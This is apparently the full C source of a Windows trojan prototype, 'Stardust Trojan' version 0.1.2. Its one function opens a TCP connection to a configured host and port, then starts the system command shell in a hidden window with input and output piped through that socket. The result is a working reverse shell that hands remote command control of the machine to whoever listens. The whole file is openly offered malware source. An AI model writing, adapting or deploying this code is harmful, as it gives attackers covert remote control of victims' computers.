/* ============ Stardust Trojan - Ver. 0.1.2 [Prototype] =============
   =                Coded by Falsedeer in 2022/12/21                 =
   =================================================================== */
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "Headers/dbg/dbg.h"

// link the lib of winsock2 to the output obj file
#pragma comment(lib, "ws2_32.lib")

// global variable
#define VERSION "0.1.2 [Prototype]"
#define HOST "127.0.0.1"
#define PORT 4444

// function declaration
void RevShell(void);

// entrypoint of stardust
int main(void){
	RevShell();
	return 0;
}

// DESC: spawn a reverse shell piping input / output to  socket connection
void RevShell(void){
	WSADATA wsa;
	SOCKET tcpsock;
	SOCKADDR_IN server;
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION processinfo;
	char cmdpath[250];
	
	WSAStartup(MAKEWORD(2, 2), &wsa); // use winsock ver 2.2
	tcpsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // use tcp
	server.sin_family = AF_INET; // specify protocol
	server.sin_port = htons(PORT); // specify port
	server.sin_addr.s_addr = inet_addr(HOST); // specify server

	// connection start
	connect(tcpsock, (struct sockaddr *)&server, sizeof(server));
	
	// get the path of the environment variable 
	if (GetEnvironmentVariable("COMSPEC", cmdpath, sizeof(cmdpath)) == 0){
		goto exit;
	} 
	
	// set the startupinfo for createprocess
	memset(&startupinfo, 0, sizeof(startupinfo));
	startupinfo.cb = sizeof(startupinfo);
	startupinfo.wShowWindow = SW_HIDE;
	startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startupinfo.hStdInput = (HANDLE)tcpsock;
	startupinfo.hStdOutput = (HANDLE)tcpsock;
	startupinfo.hStdError = (HANDLE)tcpsock;
	
	// process start
	if (CreateProcessA(NULL, cmdpath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupinfo, &processinfo) == 0){
		goto exit;
	} else {
		// wait for the created process to end before exiting and cleaning up
		WaitForSingleObject(processinfo.hProcess, INFINITE);
	}

exit:
	CloseHandle(processinfo.hProcess);
	CloseHandle(processinfo.hThread);
	closesocket(tcpsock);
	WSACleanup();
	return;
}
